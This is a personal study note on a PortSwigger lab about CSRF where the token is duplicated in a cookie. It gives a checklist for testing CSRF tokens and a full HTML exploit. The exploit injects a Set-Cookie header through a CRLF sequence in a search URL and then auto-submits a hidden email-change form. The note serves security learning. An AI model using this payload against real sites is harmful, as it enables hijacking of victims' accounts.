---
tags:
  - PRACTITIONER
Link:
  - "[[CSRF]]"
External Link:
  - https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
---

# CSRF where token is duplicated in cookie
---

- **Info:**
	- Vulnerable parameter - email change functionality
	- Goal - exploit the CSRF vulnerability to change the email address of the victim user
	- creds - `wiener:peter`

-  **Analysis:**
	- In order for CSRF attack to be possible:
		- A relevant action - ***email change functionality***
		- Cookie-based session handling - ***session cookie***
		- No unpredictable request parameters - (satisfied b/c search URL parameter allows user to set cookie)

- ~~**Testing CSRF Tokens:**~~
	1.  Remove CSRF token. and see if application accepts request.
	2. Change the request method from POST to GET.
	3. See if CSRF token is tied to a user session.

- **Testing CSRF Tokens and CSRF cookies:**
	1. Check if the CSRF token is tied to the CSRF cookie
	    - Submit an invalid CSRF Token
	    - Submit a valid CSRF Token from another user
	2. Submit valid CSRF token and cookie from another user
	3. Submit a fake identical CSRF token and cookie

- **In order to exploit this vulnerability, we need to perform 2 things:**
	1. Inject a `csrf` cookie in the user's session (Http Header injection)
	2. Send a CSRF attack to the victim with a known `csrf` token

- **Craft exploit**

```html
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display: none" name="csrf-iframe"></iframe>
        <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe">
            <input type="hidden" name="email" value="anything@normal-user.net" >
            <input type="hidden" name="csrf" value="fake" >
        </form>
        <img style="display: none;" src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

